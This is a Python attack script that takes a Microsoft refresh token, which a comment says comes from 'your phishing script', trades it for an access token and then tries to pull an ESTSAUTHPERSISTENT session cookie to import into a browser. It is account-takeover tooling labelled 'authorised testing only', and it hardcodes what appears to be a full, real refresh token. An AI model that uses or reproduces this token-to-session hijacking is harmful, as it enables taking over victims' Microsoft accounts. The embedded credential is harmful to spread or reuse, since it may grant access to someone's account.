#!/usr/bin/env python3
"""
get_session_cookie.py – Exchange a Microsoft refresh token for a browser session cookie.
Saves the cookie as JSON for direct import into EditThisCookie.
For authorised security testing ONLY.
"""

import requests
import sys
import json

# ---------- CONFIGURATION ----------
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office client
RESOURCE  = "https://graph.windows.net"

# The refresh token from your phishing script (the full string)
REFRESH_TOKEN = "1.AXcAl495fwURCkyzHBebls1UmNYOWdOzUgJBrv-q0ikqsBwAAEp3AA.BQABAwEAAAADAOz_BQD0_0V2b1N0c0FydGlmYWN0cwIAAAAAAEzmt6J1_O7uGMhJsjaf8fO1jg6B8lWfjOka80FPE0se4jMnVkg9l-0Ut5rlnHXqPQQGz7inkNK1jEQPU6-l1LFVeYuIyeyAOAaR2PJlmj8SCaSBo4dBNENFsa1g0b3cPiOiHjQJEUZJ7VtjNTMb82wsF56NQXu_2T5UTi39nFupX7SoF4R6oUFSPUL55ETsNBLmz_GNVs6iwGDU30zWv5tSv1_g2ZXOqeZTJ8NoMr70niHXYmXszVqjqmnnOrenukO2CAqmflfncKzl1I48SpJRVpe3MOPUndh9wd7SLxmjeUFPZq54XFx5S1PsNWZ1z9VI1-MsiULdTXOh3QS9qdpKGnwlhUkfxPMF0QMnQGRuJ-m-8JhFix5UFXJx4XysTqLLOw9Pxsc-yxVp3MDb5tapl0dSKPvi8HW1N9DzeB8LIxDahocaqVotKEhMZYGw2EwubxggoSxZHvTeX2cjHXRyrg5e2Z5ACmmRho0YzK-5BDBkkfAnFBj2nG4ubkaS-t82-9OiBo7ZzQLKX_XcpFCvGqKmVYdBD44nwYXUA5PEuBA8_UizRORtF79MOnYiMnZ6a-9ODyS9T2BCbiPx3Rupgv_kRKEOtsZHPA3C3wUauG-Ya2zd7y5m70J5JMS3Ik9gMCqUGRcZWIaSY1M_9SLhv1iA1Ev_JfdB0GF5FW9YDCv4U_16Bno-NCJoxUFL5XstwFt2KxOzLyUToYhOtIdNRguNXOW3nCXT14XF4LIe5lRXrhEpgu_btrDraPTHOLH3eWH5cqfUFwS9zm0qnBgRm3fCB--gbIfGRrjuyNWGPgjm56rh8VKwqgYgEDbZvV95cgvkA13LrflHY9-i74p3w6kkZlW7zI_3SWpiRvQaFbrwNFFbk18kJUEsL4M3HSjNOdn2siGsi_mDxlylX5t8ZhHqAVsA0WuPc3xHe9w8-JIhSDa0UQzfzv9I53e_vcWvX0aGZgkOhLBe0lPfamm_hVvOmm1_5AHTd8FW7iX4ryOGB2eZUy2fie2O0n_5WdlXR9dXsd7tUle4ziLnBzMQlrraoicm_m7UWsQkYHbFPshrm0fzWFwDlECDGmA5tBqCVhrYH3VtdOQi8adoXyLPuoMG8fWCRjgB6UnoRTcptMJq1Hup1JkqiTkhBaszQa2ek2lIQEtbxoTVhkhgwKmh86YbmjD84szwtsnX1QEdHJj-Rez7E9eIhCWgzyb6Khsz6MQV-rjBUul_017mA_otBiRNVGKH7n5rVjkZyfIl3XFNrLTHnaSKhY3ZCh7-wXyTW6fQhZY2JqhhaAX1VaLam6OYMeXu8Xc9uawTEea89_kJDF8sHhuibqHFNXWhN4aMj5XG-w9j3U8rcIwsdzDtVt5_r1WiKRVCXpP0_MdgzMayK57U27uO16sd3zu1hEngPSxJKnOqIYtKfGI1BvWB_nanz3Hg1DBLNlQYCQvb3FDYB36pyT7POerKC0iNIzP8GvQZ5PmgiTaigakseRgp3dl-bKXe5IKT6WktvvKAMV7rCbZO22hWO3Z9S18TkrWoJeZcijFXh6aD8Msl0xCjdD0uwCoRSERqXuP8ZhzoBYxBVPXEN4rNqA"  # <-- PASTE YOUR FULL REFRESH TOKEN HERE

# -------------------------------------------------

def main():
    # 1. Exchange refresh token for an access token for the graph.windows.net resource
    token_url = "https://login.microsoftonline.com/common/oauth2/token"
    data = {
        "grant_type": "refresh_token",
        "client_id": CLIENT_ID,
        "resource": RESOURCE,
        "refresh_token": REFRESH_TOKEN
    }
    print("[*] Requesting new access token...")
    resp = requests.post(token_url, data=data)
    if resp.status_code != 200:
        print(f"[-] Token refresh failed: {resp.json()}")
        sys.exit(1)

    tokens = resp.json()
    access_token = tokens["access_token"]
    print("[+] Access token obtained (truncated):", access_token[:50] + "...")

    # 2. Request ESTSAUTHPERSISTENT cookie using the undocumented endpoint
    cookie_url = "https://login.microsoftonline.com/common/GetCredentialType"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    body = {"resource": "https://graph.windows.net"}

    print("[*] Requesting session cookie...")
    cookie_resp = requests.post(cookie_url, headers=headers, json=body)

    try:
        resp_json = cookie_resp.json()
        cookie_value = resp_json.get("estssauthenticationpersistent") or \
                       resp_json.get("ESTSAUTHPERSISTENT") or \
                       resp_json.get("Credential")
        if not cookie_value:
            set_cookie = cookie_resp.headers.get("Set-Cookie", "")
            if "ESTSAUTHPERSISTENT=" in set_cookie:
                cookie_value = set_cookie.split("ESTSAUTHPERSISTENT=")[1].split(";")[0]
            else:
                print("[-] Could not find cookie in response body or Set-Cookie header.")
                print("Response:", cookie_resp.text)
                sys.exit(1)
    except Exception as e:
        print(f"[-] Error parsing cookie response: {e}")
        print("Response text:", cookie_resp.text)
        sys.exit(1)

    if not cookie_value:
        print("[-] Could not extract cookie.")
        sys.exit(1)

    # 3. Build cookie object in EditThisCookie JSON format
    cookie_obj = {
        "domain": ".login.microsoftonline.com",
        "name": "ESTSAUTHPERSISTENT",
        "value": cookie_value,
        "path": "/",
        "secure": True,
        "httpOnly": True
    }

    # Save as JSON file
    output_file = "sessioncookie.json"
    with open(output_file, "w") as f:
        json.dump([cookie_obj], f, indent=2)

    print(f"[+] Session cookie saved to {output_file}")
    print("    Import this file into EditThisCookie on https://login.microsoftonline.com")

if __name__ == "__main__":
    print("=" * 60)
    print("WARNING: Authorised testing only.")
    print("=" * 60)
    input("Press Enter to proceed...")
    main()